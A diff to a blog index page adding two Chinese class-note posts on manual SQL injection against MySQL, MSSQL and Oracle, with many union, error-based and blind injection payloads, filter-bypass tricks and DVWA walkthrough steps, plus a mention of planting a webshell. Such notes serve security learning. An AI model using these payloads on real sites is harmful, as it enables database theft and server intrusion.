@@ -152,6 +152,553 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-安全进阶/MSSSQL和Oracle的手工注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">MSSSQL和Oracle的手工注入</a>
+    </h1>
+  
+
+        
+        <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-04-24T01:45:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="课堂笔记"><a href="#课堂笔记" class="headerlink" title="课堂笔记"></a>课堂笔记</h2><p>MSSQL（Microsoft SQL) = SQL server</p>
+<p>PHP连接MySQL数据库、MSSQL数据库流程一致</p>
+<pre><code>mysqli_connect mysqli_query mysqli_fetch_array
+mssqli_connect mssqli_query mssqli_fetch_array</code></pre>
+<p>注入的关键在于是否有一个数据库或者表存放了数据库名称、表名称、字段名称。</p>
+<p>其他数据库注入：</p>
+<ul>
+<li>其他数据库在哪里存放了数据库名称等信息</li>
+<li>其中的函数是否一致，若不一致</li>
+</ul>
+<p>MSSQL的内置数据库master，存在3张表</p>
+<ul>
+<li><p>sysdatabases存放数据库名称，name字段存放所有数据库名</p>
+</li>
+<li><p>sysobjecs存放表名称，name字段存放当前数据库的所有表名（注意，该表存在于每个数据库中）</p>
+</li>
+<li><p>sysColumns存放字段名称，name字段存放所有字段名（注意，该表存在于每个数据库中）</p>
+</li>
+</ul>
+<p>查询格式：</p>
+<pre><code>select * from db_name.user_name.table_name  #注意要加上操作用户的名称
+
+#查询数据库名称
+select name from master.dbo.sysdatabases
+也可以默认操作源
+select name from master..sysdatabases</code></pre>
+<p>mssql中没有group_concat、limit，若查询结果有多行，可用top n可以取到前n行的数据，若要查询指定行的数据：</p>
+<pre><code class="sql">--先查询m行的数据，然后把该数据丢弃，向下再查询n行的数据。例如：查询第2行的数据。
+select top 1 usernam from users where username not in (select top 1 username from users);</code></pre>
+<p>获取到数据库名称后，查询该数据库的所有表的名称</p>
+<pre><code class="sql">select name from db_name..sysobjects where xtype=&#39;U&#39;</code></pre>
+<p>获取所有字段。例如jiaofan数据库里的sl_admin表的所有字段</p>
+<pre><code class="sql">select name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;)
+
+--查询第2行的字段值
+select top 1 name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;) and name not in(select top 1 name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;)
+)
+</code></pre>
+<p>简化查询，使用内置函数object_id()根据表名返回数据库表名ID。</p>
+<pre><code class="sql">select name from jiaofan..syscolumns where id=object(&#39;sl_admin&#39;)
+
+--查询第2行的字段值
+select top 1 name from jiaofan..syscolumns where id=object(&#39;sl_admin&#39;) and name not in(select top 1 name from jiaofan..syscolumns where id=object(&#39;sl_admin&#39;))</code></pre>
+<p>msssql为强类型数据库，union查询的列数和类型必须相同，因此联合查询前需要判断数据类型。</p>
+<p>union all select</p>
+<p>报错注入：</p>
+<ul>
+<li>判断数据库基本信息：and 1=(select @@version)</li>
+<li>获取当前数据库用户：and 1=(select current_user)</li>
+</ul>
+<pre><code class="sql">select * from jiaofan..users where id=1 and 1=(select db_name())
+
+%&#39; and 1=(select name from jiaofan..sysobjects where xtype=&#39;U&#39;) -- 
+
+%&#39; and 1=(select top 1 name from jiaofan..sysobjects where xtype=&#39;U&#39; and name not in(select top 1 name from jiaofan..sysobjects where xtype=&#39;U&#39;)) -- </code></pre>
+<p>时间型盲注：waitfor delay ‘3’ </p>
+<pre><code class="sql">if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39;
+
+select 1 where 1=1 if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39;
+
+%&#39; if ((select substring(user,1,1))=&#39;d&#39;) waitfor delay &#39;0:0:3&#39;-- </code></pre>
+<p>mysql – 一个账号可以访问所有的表</p>
+<p>mssql –一个账号可以访问所有的表，但是访问时必须表明自己的身份</p>
+<p>Oracle – 一个账号只能管理一个数据库</p>
+<p>oracle 查询需要带上表名，dual万能表。</p>
+<pre><code>select 1,2,3 from dual       </code></pre>
+<p>查询当前数据库的所有表名</p>
+<pre><code>select table_name from user_tables</code></pre>
+<p>查询表名为xxx的所有字段名</p>
+<pre><code>select column_name from user_tab_columns where table_name=&#39;xxx&#39;</code></pre>
+<p>联合查询：</p>
+<pre><code>-1&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3&#39; from dual --  
+
+
+-1&#39; union select table_name,&#39;2&#39;,&#39;3&#39; from user_tables where rownum=1 --  //查询到一张表T_USER
+
+-1&#39; union select column_name,&#39;2&#39;,&#39;3&#39; from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 --  //查询到一个字段SUSER
+
+-1&#39; union select SUSER,&#39;2&#39;,&#39;3&#39; from T_USER where rownum=1 --  </code></pre>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安全进阶/MySQL的手工注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">MySQL的手工注入</a>
+    </h1>
+  
+
+        
+        <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-04-24T01:43:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="MySQL数据库的特性"><a href="#MySQL数据库的特性" class="headerlink" title="MySQL数据库的特性"></a>MySQL数据库的特性</h2><h3 id="MySQL内置函数"><a href="#MySQL内置函数" class="headerlink" title="MySQL内置函数"></a>MySQL内置函数</h3><h4 id="获取数据库类"><a href="#获取数据库类" class="headerlink" title="获取数据库类"></a>获取数据库类</h4><p>（1）获取数据库版本</p>
+<ul>
+<li>version()</li>
+<li>@@version</li>
+</ul>
+<p>（2）获取数据库路径：@@datadir</p>
+<p>（3）获取数据库名：database()</p>
+<p>（4）获取用户名：user()</p>
+<p>（5）组合获取</p>
+<ul>
+<li>concat()                    #拼接函数，例concat(0x7e,string,0x7e)，其中0x7e为波浪号的十六进制</li>
+<li>group_concat()        #将查询的多行结果放在一行显示</li>
+</ul>
+<h4 id="功能类"><a href="#功能类" class="headerlink" title="功能类"></a>功能类</h4><p>（1）统计型</p>
+<ul>
+<li>count()            #可查询某字段有多少行记录，例count(username)</li>
+<li>length()</li>
+</ul>
+<p>（2）编码转换</p>
+<ul>
+<li>ord()</li>
+<li>char()</li>
+<li>hex()</li>
+<li>bin()</li>
+</ul>
+<p>（3）截断函数</p>
+<ul>
+<li>substr()</li>
+<li>mid()</li>
+<li>left()</li>
+<li>right()</li>
+</ul>
+<p>（4）睡眠：sleep()</p>
+<h3 id="MySQL内置系统表"><a href="#MySQL内置系统表" class="headerlink" title="MySQL内置系统表"></a>MySQL内置系统表</h3><p>information_schema数据库，该数据库默认的三张表schemata、tables、columns</p>
+<p>数据表：</p>
+<p>1.schemata  schema_name属性存放所有数据库名</p>
+<p>2.tables     table_name 存放表名</p>
+<p>3.columns column_name 存放列名</p>
+<pre><code class="SQL">-- 在imformation_schema数据库中的schemata表中查询所有数据库名称
+select schema_name from information_schema.schemata; 
+
+-- 在information_schema数据库中的tables表中查询数据库名称为dvwa的所有的表的名称
+select table_name from information_schema.TABLES where table_schema=&quot;dvwa&quot;; 
+
+-- 在information_schema数据库中的columns表中查询数据库名称为dvwa的users表的的所有字段
+select column_name from information_schema.columns where table_schema=&quot;dvwa&quot; and table_name=&quot;users&quot;; 
+
+-- group_concat() 获取查询的所有结果
+-- &quot;&lt;hr&gt;&quot; 用来优化查询的显示效果(水平线)，因为该字符会伴随查询结果显示到页面上
+-- &quot;&lt;hr&gt;&quot; 可用16进制来表示，表示为 0x3c68723e
+select group_concat(&quot;&lt;hr&gt;&quot;,schema_name) from information_schema.schemata; </code></pre>
+<p><img src="https://i.loli.net/2021/04/25/oTqezSNiplvhPM1.png" alt="image-20210425204513085"></p>
+<h2 id="MySQL联合查询技巧"><a href="#MySQL联合查询技巧" class="headerlink" title="MySQL联合查询技巧"></a>MySQL联合查询技巧</h2><h3 id="获取数据的基本技巧"><a href="#获取数据的基本技巧" class="headerlink" title="获取数据的基本技巧"></a>获取数据的基本技巧</h3><p>（1）判断数据库列数：order by N，当order by N时页面报错，则判断列数为N-1</p>
+<p>（2）判断数据回显位置：union select 1,2,3,4,…..N</p>
+<p>（3）获取任意几行数据：</p>
+<pre><code class="sql">select * from admin limit 5,3         -- 跳过5行数据，选取后面三行数据，即第6,7,8行
+select * from admin limit 3 offset 5  -- 跳过5行数据，选取后面三行数据，即第6,7,8行
+-- offset X是跳过X个数据，limit Y是选取Y个数据</code></pre>
+<p>（4）“admin” 可用16进制 0x61646d696e 表示</p>
+<h3 id="编码技巧"><a href="#编码技巧" class="headerlink" title="编码技巧"></a>编码技巧</h3><p>（1）编码绕过字符串引号被过滤情况</p>
+<ul>
+<li>hex编码：hackbar–&gt;Encoding–&gt;Hex Encoding–&gt;String to 00ff00ff</li>
+<li>ASCII编码：hackbar–&gt;MySQL–&gt;MySQL CHAR()</li>
+</ul>
+<pre><code class="sql">?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns 
+where table_schema=&#39;admin&#39;
+?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns 
+where table_schema=0x61646d696e
+?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns 
+where table_schema=CHAR(97, 100, 109, 105, 110)</code></pre>
+<p>（2）数据库本身编码问题</p>
+<ul>
+<li>如执行UNION 查询时，报错：Illegal mix of collations for operation ‘UNION’。</li>
+<li>可以用convert()进行编码转换</li>
+</ul>
+<pre><code class="sql">-- 如：group_concat(TABLE_NAME)
+group_concat(convert(TABLE_NAME using gbk))
+group_concat(convert(TABLE_NAME using latin1))   -- 最常用
+group_concat(convert(TABLE_NAME using binary))
+group_concat(convert(TABLE_NAME using utf-8)
+group_concat(convert(TABLE_NAME using utf8))
+-- 其中， Latin1是ISO-8859-1的别名，有些环境下写作Latin-1。ISO-8859-1编码是单字节编码，向下兼容ASCII。</code></pre>
+<h2 id="MySQL报错注入技巧"><a href="#MySQL报错注入技巧" class="headerlink" title="MySQL报错注入技巧"></a>MySQL报错注入技巧</h2><p>（1）使用条件：HTTP返回包中含有原始数据库的报错信息。</p>
+<p>（2）MYSQL报错注入和核心——报错函数</p>
+<ul>
+<li>extractvalue()</li>
+</ul>
+<pre><code class="sql">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></pre>
+<ul>
+<li>updatexml()</li>
+</ul>
+<pre><code class="sql">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code></pre>
+<ul>
+<li>exp()</li>
+</ul>
+<pre><code class="sql">id=1 and exp(~(select * from(select user())a))</code></pre>
+<h2 id="MySQL盲注技巧"><a href="#MySQL盲注技巧" class="headerlink" title="MySQL盲注技巧"></a>MySQL盲注技巧</h2><p>（1）使用条件：HTTP返回包中没有执行结果的数据和报错信息。</p>
+<p>（2）MYSQL盲注的核心——字符串截断函数、条件判断语句</p>
+<ul>
+<li>left(string,n)函数，取字符串的前n个字符</li>
+</ul>
+<pre><code class="sql">?id=1 and left(database(),1)=&quot;a&quot;     --&gt; TRUE
+?id=1 and left(database(),2)=&quot;ad&quot;    --&gt; TRUE
+?id=1 and left(database(),3)=&quot;adm&quot;   --&gt; TRUE
+?id=1 and left(database(),4)=&quot;admi&quot;  --&gt; TRUE
+?id=1 and left(database(),5)=&quot;admin&quot; --&gt; TRUE</code></pre>
+<ul>
+<li>substr(string,m,n)、mid()函数 ，其中substr较常用，n表示取n个字符，m表示从第几个开始取。（取字符串的第m个到第n个字符。）</li>
+</ul>
+<pre><code class="sql">?id=1 and substr(database(),1,1)=&quot;a&quot;    --&gt; TRUE 
+?id=1 and substr(database(),1,2)=&quot;ad&quot;   --&gt; TRUE 
+?id=1 and substr(database(),1,3)=&quot;adm&quot;  --&gt; TRUE 
+?id=1 and substr(database(),1,4)=&quot;admi&quot; --&gt; TRUE 
+?id=1 and substr(database(),1,5)=&quot;admin&quot; --&gt; TRUE
+-- 或者：
+?id=1 and substr(database(),1,1)=&quot;a&quot; --&gt; TRUE 
+?id=1 and substr(database(),2,1)=&quot;d&quot; --&gt; TRUE 
+?id=1 and substr(database(),3,1)=&quot;m&quot; --&gt; TRUE 
+?id=1 and substr(database(),4,1)=&quot;i&quot; --&gt; TRUE 
+?id=1 and substr(database(),5,1)=&quot;n&quot; --&gt; TRUE </code></pre>
+<ul>
+<li>regexp+’正则表达式’</li>
+</ul>
+<pre><code class="sql">id=1 and (select database() regexp=&#39;^a&#39;) -- ^表示匹配前面字符串的第一个字符。
+id=1 and (select database() regexp=&#39;^ad&#39;) -- ^表示匹配前面字符串的前两个字符。</code></pre>
+<ul>
+<li>like + 条件 （模糊匹配，用于替代=）</li>
+</ul>
+<pre><code class="sql">?id=1 and (select database() like &#39;a%&#39;) --&gt; TRUE 
+?id=1 and (select database() like &#39;ad%&#39;) --&gt; TRUE 
+?id=1 and (select database() like &#39;adm%&#39;) --&gt; TRUE 
+?id=1 and (select database() like &#39;admi%&#39;) --&gt; TRUE 
+?id=1 and (select database() like &#39;admin%&#39;) --&gt; TRUE </code></pre>
+<ul>
+<li>取ascii()、ord()来精确获取值（避免大小写字母无法判断的情况）</li>
+</ul>
+<pre><code class="sql">?id=1 and ascii(substr(database(),1,1))=97 --&gt;TRUE
+?id=1 and ascii(substr(database(),1,1))=64 --&gt;FALSE</code></pre>
+<ul>
+<li>取hex 来精确获取值（避免大小写字母无法判断的情况）</li>
+</ul>
+<pre><code class="sql">?id=1 and hex(substr(database(),1,1))=61 --&gt;TRUE
+?id=1 and hex(substr(database(),1,1))=41 --&gt;FALSE</code></pre>
+<ul>
+<li>在语句中添加binary （二进制）来精确获取值（避免大小写字母无法判断的情况）</li>
+</ul>
+<pre><code class="sql">?id=1 and (select binary database() regexp&#39;^a&#39;)  --&gt;TRUE
+?id=1 and (select binary database() regexp&#39;^A&#39;)  --&gt;FALSE</code></pre>
+<ul>
+<li>if()函数</li>
+</ul>
+<pre><code class="sql">?id=1 and 1=if(left(database(),1)=&#39;a&#39;,1,0)         --&gt;TRUE
+?id=1 and 1=if(substr(database(),1,1)=&#39;a&#39;,1,0)     --&gt;TRUE
+?id=1 and 1=if(ascii(left(database(),1))=&#39;97&#39;,1,0) --&gt;TRUE
+?id=1 and 1=if(ord(left(database(),1))=&#39;97&#39;,1,0)   --&gt;TRUE
+?id=1 and 1=if(database() regexp&#39;^a&#39;,1,0)          --&gt;TRUE
+?id=1 and if(left(database(),1)=&#39;a&#39;,sleep(3),0)    --&gt;TRUE</code></pre>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>正则表达式(regexp)的主要作用：分割、匹配、查找、替换</p>
+<p>WAF—Web Application Firewall(Web应用防火墙)</p>
+<p>*匹配前一个字符出现0次或者无限次</p>
+<p>?匹配前一个字符出现1次或者0次，即要么有1次，要么没有</p>
+<p>.*任意一个字符可以出现0次或无限次（贪婪匹配，尽可能多地匹配）</p>
+<p>.*?仍然表示任意一个字符可以出现0次或无限次（非贪婪匹配，尽可能少地区匹配）</p>
+<pre><code>正则表达式：.*test.* 在任意字符中匹配test
+test1
+test2
+test3
+3test4</code></pre>
+<pre><code>.*t     匹配结果：123456test #匹配到的是最后一个t，前面的所有内容包括tes都被当做任意字符去匹配，可出现0次或无限次
+.*?t    匹配结果：123456t   #匹配到的是第一个t，前面的123456被当做任意字符
+123456test</code></pre>
+<p>preg_match((.*?),$_GET[‘user’],$return);  //在字符串中查找匹配项，返回一个数组</p>
+<p>preg_replace((.*?),’\\n’,$_GET[‘user’]);    //将查找到的字符串替换成\\n</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>报错注入的测试语句 ‘ “ ) —联合查询、报错</p>
+<p>布尔型 and 1=1 and 1=2 —–布尔型盲注</p>
+<p>时间型 and sleep(5) —-时间型盲注</p>
+<p>步骤：</p>
+<p>1.选择该注入点的注入方式</p>
+<p>2.判断数据库类型</p>
+<p>3.选择漏洞利用的目标，优先选择读写文件</p>
+<p>4.构造SQL语句进行攻击</p>
+<h3 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h3><h4 id="1-对某个网站进行注入，分为四个步骤"><a href="#1-对某个网站进行注入，分为四个步骤" class="headerlink" title="1.对某个网站进行注入，分为四个步骤"></a>1.对某个网站进行注入，分为四个步骤</h4><ul>
+<li>判断闭合类型、使用的语句方法</li>
+<li>判断数据库 —SQL语句判断（表的特征）或者根据网站环境猜测，也可以根据返回的报错信息判断。</li>
+</ul>
+<pre><code>不同数据库的特征：
+mysql information_schema
+sqlserver sysobjects
+oracle dual</code></pre>
+<ul>
+<li>选择利用的操作 – 操作数据/执行命令/读写文件（通过在网站下写一句话木马来控制服务器，但前提是知道网站根目录的绝对路径）</li>
+<li>构造SQL注入语句 – 向数据库发起查询以获取有用的信息。</li>
+</ul>
+<h4 id="2-MySQL手工注入的方式"><a href="#2-MySQL手工注入的方式" class="headerlink" title="2.MySQL手工注入的方式"></a>2.MySQL手工注入的方式</h4><ul>
+<li>联合查询 使用union操作符将两个select语句拼接起来同时在数据库中进行查询，将查询结果显示在页面上。</li>
+<li>报错注入 通过网站的报错信息，某些特殊函数会将函数内的SQL语句进行执行，若该函数出现报错，则会将查询结果返回在页面上。</li>
+<li>布尔型盲注 通过网站不同的回显信息，判断查询语句的正确与否，可以在and后构造SQL语句向数据库发起查询，若后续的SQL语句正确，则返回正常结果，以此获取信息 例如：id=1 and 1=1 返回正常；id=1 and 1=2 返回异常；</li>
+<li>时间型盲注 通过页面的返回时间来判断SQL语句是否正确。若正确，例如在SQL查询语句后加上sleep(5)来判断。</li>
+</ul>
+<h4 id="3-MySQL中如何进行对应的注入"><a href="#3-MySQL中如何进行对应的注入" class="headerlink" title="3.MySQL中如何进行对应的注入"></a>3.MySQL中如何进行对应的注入</h4><ul>
+<li>内置数据库：information_schema</li>
+</ul>
+<pre><code>内置表schemata，存放数据库名
+内置表tables，存放表名和数据库名的对应关系
+内置表columns，存放了字段名和表名、数据库名的对应关系</code></pre>
+<ul>
+<li>联合查询</li>
+</ul>
+<pre><code>order by 以查询结果中的某一列进行排序。若该列不存在，则会产生报错。
+union select 使用union操作符将前后两个select语句放在数据库中同时查询（union操作符前后的select语句列数、字符类型需要相等）由于MySQL是弱类型数据库，故不需要字符类型相同。</code></pre>
+<h4 id="4-联合查询的流程"><a href="#4-联合查询的流程" class="headerlink" title="4.联合查询的流程"></a>4.联合查询的流程</h4><ul>
+<li>判断可以注入的方式以及该注入点的闭合形式</li>
+<li>判断前一个SQL语句查询的列数（order by）</li>
+</ul>
+<pre><code>例如对dvwa的注入过程：
+单引号字符型
+联合查询 报错注入 盲注
+判断前一个查询语句查询了两列
+判断数据的回显位置（把前面的SQL参数置空，在后面使用union select 1,2来判断回显位置）
+说明union select查询的两个字段都会显示在页面上，则可以在1和2的位置构造SQL语句向数据库发起查询。
+将查询结果放在一行显示用group_concat()函数。
+编码问题convert--用来解决查询时的编码问题。该函数可以修改当前数据库的查询编码convert(colname using latin1)
+获取数据库名、表名和列名后查询数据,查询user和password字段的值：
+-1&#39; union select user,password form dvwa.users;</code></pre>
+<ul>
+<li>union select查询数据库、表、字段、数据的信息</li>
+<li>union特性：前后的select语句的列数必须一致 —-需要知道网站构造的SQL语句查询了几个字段</li>
+</ul>
+<pre><code>1&#39; union select 1,2#         字符型
+1 union select 1,2           数字型</code></pre>
+<ul>
+<li>查询时一般让union前的SQL语句执行结果置空，转而执行union后面的select查询语句。</li>
+</ul>
+<pre><code>-1&#39; union select 1,2#
+#convert(xxx using latin1) 进行编码转化,避免查询的前后两个字段编码不同。
+select 1,convert(table_name using latin1) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;
+
+#group_concat()函数，将查询的结果放在一行显示
+select 1,group_concat(convert(table_name using latin1)) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;</code></pre>
+<h5 id="EXP-amp-PoC"><a href="#EXP-amp-PoC" class="headerlink" title="EXP &amp; PoC"></a>EXP &amp; PoC</h5><p>EXP:exploit 攻击脚本–如何利用该漏洞执行特定的效果(操作数据、控制系统)–有害的</p>
+<pre><code>-1&#39; union select database(),group_concat(convert(schema_name using latin1)) from information_schema.schemata#;获取当前数据库名和网站数据库中的所有数据库名</code></pre>
+<p>PoC：Proof of Concept观点证明–证明该漏洞存在 —无害的</p>
+<pre><code>1&#39; union select 1,2#      可以发现存在的漏洞</code></pre>
+<h4 id="5-报错注入、盲注的流程"><a href="#5-报错注入、盲注的流程" class="headerlink" title="5.报错注入、盲注的流程"></a>5.报错注入、盲注的流程</h4><ul>
+<li>判断注入方式及闭合形式（不需要判断前一个SQL语句查询的列数。）</li>
+<li>使用特定语法进行注入，查询数据库、表、字段、数据的信息</li>
+</ul>
+<pre><code>报错注入函数
+extractvalue(value,path)--如果在path位置构造一个SQL语句，这个语句会先将被数据库进行执行。若path位置存在错误，则extractvalue函数会产生报错，将报错信息显示在页面上。该函数存在吃字符现象，无法完全显示报错的返回结果。
+报错注入的重点：在path的位置构造一个子句</code></pre>
+<ul>
+<li>limit(m,n)从第m行开始，查询后n行的数据。</li>
+</ul>
+<pre><code>limit(0,1) //从第0行开始，向后查询1行。也就是只查询第1行
+limit(5,3) //从第5行开始，向后查询3行。也就是查询6,7,8行。</code></pre>
+<h4 id="6-盲注"><a href="#6-盲注" class="headerlink" title="6.盲注"></a>6.盲注</h4><p>（1）核心思想：根据页面是否正常返回结果来判断后面构造的SQL语句是否正确。</p>
+<pre><code>select * from users where user_id=&quot;1&quot; and (select database())=&quot;dvwa&quot;;</code></pre>
+<p>（2）截断函数left()</p>
+<pre><code>select * from users where user_id=&quot;1&quot; and (select left(database(),1))=char(97);</code></pre>
+<p>（3）substr(string,m,n) ，该函数可返回字符串的一部分。例如，substr(string,1,1)返回从第1个到第3个字符。substr(string,2,1)表示从第2个字符开始，返回1个字符；也就是返回第2个字符</p>
+<pre><code>爆破思想：只改变m和等号后面的字符
+id=1 and (select substr(database(),1,1))=&quot;a&quot;
+id=1 and substr(database(),2,1)=&quot;d&quot;
+id=1 and substr(database(),3,1)=&quot;m&quot;
+id=1 and substr(database(),4,1)=&quot;i&quot;
+id=1 and substr(database(),5,1)=&quot;n&quot;</code></pre>
+<p>（4）regexp+‘正则表达式’</p>
+<pre><code>id=1 and (select database() regexp=&#39;^a&#39;) //^表示匹配前面字符串的第一个字符。
+id=1 and (select database() regexp=&#39;^ad&#39;) //^表示匹配前面字符串的前两个字符。</code></pre>
+<p>（5）length()</p>
+<pre><code>1&#39; and (select length(database())&lt;10)</code></pre>
+<p>（6）步骤：</p>
+<ul>
+<li>获取当前需要查询的内容的长度</li>
+<li>根据对应的长度进行每一位字符的爆破</li>
+</ul>
+<p>（7）常用工具：Burp Suite。爆破时可能会存在符号编码问题(例如引号、空格无法识别），可在网页中提交时用burp抓包后发送到Intruder再标记要爆破的内容。</p>
+<pre><code>1&#39; and (select substr(database(),1,1)=char(97))#
+1&#39; and (select substr(database(),2,1)=char(97))#
+1&#39; and (select substr(database(),3,1)=char(97))#
+1&#39; and (select substr(database(),4,1)=char(97))#
+1&#39; and (select substr(database(),1,1)=char(98))#
+1&#39; and (select substr(database(),2,1)=char(98))#
+......</code></pre>
+<p>逗号的ASCII码为44，可用此来区分返回结果中的不同数据库名称、表名、字段名、数据。</p>
+<p>字母a-z：97-122，MySQL对大小写不敏感</p>
+<p>数字0-1:448-57</p>
+<p>下划线：95</p>
+<p><strong>时间型盲注</strong>：</p>
+<p>if()函数。</p>
+<pre><code>#1=1是条件，success为条件成立时的操作，failed为条件不成立的操作
+select if(1=1,&quot;success&quot;,&quot;failed&quot;) 
+select if(&quot;sql语句&quot;=&quot;值&quot;,sleep(3),0)
+
+?id=1&#39; and if(left(database(),1)=&#39;a&#39;,sleep(3),0)</code></pre>
+<h2 id="常见的过滤"><a href="#常见的过滤" class="headerlink" title="常见的过滤"></a>常见的过滤</h2><ul>
+<li>单引号、双引号被过滤，用char()、十六进制。</li>
+<li>substr()被过滤，用left()、mid()、regexp()、like()</li>
+<li>extractvalue()被过滤，用updataxml()、floor()、exp()</li>
+<li>在单引号、双引号前加了转义符，则用宽字节注入 引号前加%df</li>
+<li>过滤了union、select、where等字符串</li>
+</ul>
+<pre><code>将关键字替换成了空字符，
+1.这时可用双写绕过，ununionion
+2.大小写绕过，UnioN</code></pre>
+<ul>
+<li>过滤空格</li>
+</ul>
+<pre><code>将空格替换成了空字符
+1./**/
+2.0x09
+3.&#123;$IFS&#125; （在Linux中，代表一个空格）</code></pre>
+<ul>
+<li>宽字节注入、堆叠注入</li>
+</ul>
+<h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>order by  x 以x列进行排序</p>
+<p>若order by 3显示正常，order by 4显示异常，则代表有3列</p>
+<p>用order by判断列数时可借助二分法的思想快速判断。</p>
+<pre><code>1&#39; order by 4 --+            字符型
+1 order by 4                 数字型</code></pre>
+<h2 id="Windows下的命令"><a href="#Windows下的命令" class="headerlink" title="Windows下的命令"></a>Windows下的命令</h2><pre><code>netstat -ano | findstr &quot;8080&quot;   //查询8080端口是否被占用
+tasklist /svc | findstr 9940   //查询9940这个进程</code></pre>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Python/运用Python语言(五)-网络爬虫和自动化01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -592,187 +1139,162 @@ SELECT title,context FROM `news` WHERE newsid= 11 waitfor delay &#39;0:0:4&#39;
 对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接
 SELECT score FROM `info` WHERE name=&#39;lilei&#39; waitfor delay &#39;0:0:4’</code></pre>
